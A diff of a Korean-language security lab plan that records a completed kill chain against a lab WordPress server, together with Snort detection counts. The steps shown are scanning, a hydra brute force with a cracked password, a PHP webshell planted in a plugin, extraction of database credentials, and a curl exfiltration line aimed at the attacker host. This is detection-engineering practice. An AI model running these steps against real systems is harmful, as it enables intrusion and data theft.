@@ -202,13 +202,26 @@ Kali   (10.50.50.30) ─┘                                  │
 ### Phase 3. 킬체인 공격 + 탐지 엔지니어링
 
 **킬체인 공격 수행**
-- [ ] 정찰 — wpscan + nmap으로 WordPress 스캔 (T1595)
-- [ ] 초기 침투 — SQLi 또는 취약 플러그인 익스플로잇 (T1190)
-- [ ] 인증 공격 — wp-login.php / xmlrpc.php 브루트포스 (T1110)
-- [ ] 지속성 — PHP 웹쉘 업로드 via File Manager CVE (T1505.003)
-- [ ] 내부 정찰 — 웹쉘에서 내부 네트워크 스캔 (T1046)
-- [ ] DB 접근 — wp-config.php 인증정보로 고객 데이터 조회 (T1213)
-- [ ] 유출 시도 — 외부 전송 시도 + DMZNET 차단 확인 (T1041)
+- [x] 정찰 — wpscan + nmap으로 WordPress 스캔 (T1595)
+  - [x] nmap: 80(Bee-box), 8080(WordPress) open, 443/3306 filtered
+  - [x] wpscan: WordPress 7.1, XML-RPC 활성, readme.html 노출, 1,970 requests
+- [x] 초기 침투 — SQLi 시도 (T1190)
+  - [x] sqlmap `?s=test` → WordPress 코어 Prepared Statement 보호로 SQLi 실패
+  - [x] 공격 시도 자체가 Snort/Splunk에 18건 기록 (탐지 유의미)
+- [x] 인증 공격 — wp-login.php 브루트포스 (T1110)
+  - [x] hydra 13회 시도 → `admin / rlaquddn1@` 크래킹 성공 (약 30초)
+  - [x] Snort SID 1000001 탐지 1,978건, SID 1000002 탐지 8건
+- [x] 지속성 — PHP 웹쉘 삽입 via WP File Manager (T1505.003)
+  - [x] Hello Dolly 플러그인 hello.php에 웹쉘 코드 삽입 (WP File Manager Code Editor)
+  - [x] `curl /?cmd=whoami` → www-data 확인
+- [x] 내부 정찰 — 웹쉘에서 서버 정보 수집 (T1046)
+  - [x] id, hostname, ip addr, wp-config.php DB 인증정보 추출
+  - [x] DMZ IP(10.0.10.80), DB서버(10.0.100.60), 계정(wp_admin/WpAdmin!2024) 확인
+- [x] DB 접근 — wp-config.php 인증정보로 MySQL 접근 (T1213)
+  - [x] DMZ→Inner-net MySQL 접근 성공, 테이블 목록 및 wp_users 데이터 탈취
+  - [x] admin / admin@techsolution.local / bcrypt 해시 획득
+- [x] 유출 시도 — 외부 전송 시도 + 차단 확인 (T1041)
+  - [x] `curl http://10.50.50.30:8888/exfil` → Connection refused (유출 실패)
 
 **탐지 엔지니어링**
 - [ ] 커스텀 Snort 룰 탐지 테스트 (9개 룰)
